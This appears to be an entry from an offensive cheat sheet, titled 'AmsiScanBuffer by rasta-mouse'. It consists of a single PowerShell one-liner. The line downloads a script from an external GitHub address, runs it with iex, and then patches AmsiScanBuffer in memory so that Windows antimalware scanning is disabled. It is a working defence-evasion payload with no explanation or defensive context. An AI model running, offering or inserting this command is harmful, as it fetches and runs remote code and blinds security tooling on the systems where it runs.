### AmsiScanBuffer by rasta-mouse (1.ps1)

```
iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/amsi/master/1.ps1");$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

